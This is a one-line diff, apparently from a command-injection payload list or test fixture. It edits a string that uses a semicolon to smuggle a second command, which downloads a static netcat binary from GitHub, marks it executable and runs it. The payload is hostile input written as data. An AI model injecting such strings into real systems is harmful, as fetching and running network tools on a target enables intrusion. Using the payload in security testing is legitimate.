@@ -1,1 +1,1 @@
-ping; wget https://github.com/yunchih/static-binaries/raw/master/nc && chmod +x nc && ./nc -v
+; wget https://github.com/yunchih/static-binaries/raw/master/nc && chmod +x nc && ./nc -V
